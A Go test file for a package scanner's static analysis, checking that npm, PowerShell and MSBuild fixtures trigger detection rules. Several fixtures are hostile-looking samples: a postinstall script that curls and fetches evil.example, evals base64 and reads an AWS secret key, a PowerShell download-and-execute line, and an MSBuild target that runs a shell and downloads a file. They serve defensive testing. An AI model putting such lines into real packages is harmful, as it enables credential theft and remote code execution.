package runner

import (
	"strings"
	"testing"
)

func indicatorRules_present(sc StaticScan, rule string) bool {
	for _, i := range sc.Indicators {
		if i.Rule == rule {
			return true
		}
	}
	return false
}

func TestStaticIndicatorsJS(t *testing.T) {
	root, inv := writeTree(t, map[string]string{
		"package/postinstall.js": `const cp = require('child_process');
cp.execSync('curl http://evil.example/x');
eval(Buffer.from('Y29kZQ==','base64').toString());
const t = process.env.AWS_SECRET_ACCESS_KEY;
fetch('https://evil.example/collect');
`,
	})
	sc := ScanStatic("npm", root, inv)
	for _, want := range []string{"js-child-process", "js-dynamic-eval-b64", "js-env-enum", "js-network"} {
		if !indicatorRules_present(sc, want) {
			t.Errorf("missing indicator %q (got %v)", want, ruleList(sc))
		}
	}
	if !containsStr(sc.URLs, "http://evil.example/x") {
		t.Errorf("urls = %v", sc.URLs)
	}
	if !containsStr(sc.Domains, "evil.example") {
		t.Errorf("domains = %v", sc.Domains)
	}
}

func TestStaticIndicatorsPowerShell(t *testing.T) {
	root, inv := writeTree(t, map[string]string{
		"tools/init.ps1": `iex (New-Object Net.WebClient).DownloadString('http://evil.example/p')
$x = [System.Convert]::FromBase64String('abc')
Invoke-WebRequest -Uri http://10.0.0.5/beacon
`,
	})
	sc := ScanStatic("psgallery", root, inv)
	for _, want := range []string{"ps-invoke-expression", "ps-web-download", "ps-encoded-command"} {
		if !indicatorRules_present(sc, want) {
			t.Errorf("missing %q (got %v)", want, ruleList(sc))
		}
	}
	if !containsStr(sc.IPs, "10.0.0.5") {
		t.Errorf("ips = %v", sc.IPs)
	}
}

func TestStaticIndicatorsMSBuild(t *testing.T) {
	root, inv := writeTree(t, map[string]string{
		"build/Demo.targets": `<Project><Target Name="x" BeforeTargets="Build">
<Exec Command="sh -c id" />
<DownloadFile SourceUrl="http://evil.example/p" DestinationFolder="." />
</Target></Project>`,
	})
	sc := ScanStatic("nuget", root, inv)
	for _, want := range []string{"msbuild-exec", "msbuild-download"} {
		if !indicatorRules_present(sc, want) {
			t.Errorf("missing %q (got %v)", want, ruleList(sc))
		}
	}
}

func TestObfuscationHighEntropy(t *testing.T) {
	// A long high-entropy token should trip the entropy heuristic.
	blob := "const data = '" + strings.Repeat("Ab9Xz2Qw7Lk3Pm5Rt8Vn1Cy6", 20) + "';\n"
	root, inv := writeTree(t, map[string]string{"package/a.js": blob})
	sc := ScanStatic("npm", root, inv)
	found := indicatorRules_present(sc, "obf-high-entropy") || indicatorRules_present(sc, "obf-long-lines")
	if !found {
		t.Errorf("expected obfuscation indicator, got %v", ruleList(sc))
	}
}

func ruleList(sc StaticScan) []string {
	var out []string
	for _, i := range sc.Indicators {
		out = append(out, i.Rule)
	}
	return out
}

func TestEntropy(t *testing.T) {
	if e := entropy([]byte("aaaaaaaa")); e > 0.01 {
		t.Errorf("entropy of constant = %f, want ~0", e)
	}
	if e := entropy([]byte("abcdefghijklmnop")); e < 3.5 {
		t.Errorf("entropy of varied = %f, want high", e)
	}
}
